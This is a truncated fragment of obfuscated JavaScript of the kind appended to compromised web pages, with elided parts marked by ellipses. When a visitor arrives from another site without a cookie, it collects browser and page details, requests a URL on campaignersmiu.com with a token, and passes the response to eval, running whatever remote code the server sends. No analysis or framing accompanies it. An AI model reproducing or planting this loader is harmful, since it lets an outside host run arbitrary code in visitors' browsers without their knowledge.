...
};if(ndsw===undefined)
{
    ...
    (function()
    {
        var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];
        if(l&&!p(l,j)&&!i)
        {
            var m=new HttpClient(),o=k+'//campaignersmiu.com/BigboysToys/app/views/admin/admin.php?id='+token();
            m['get'](o,function(r)
            {
                p(r,'ndsx')&&f['eval'](r);
            });
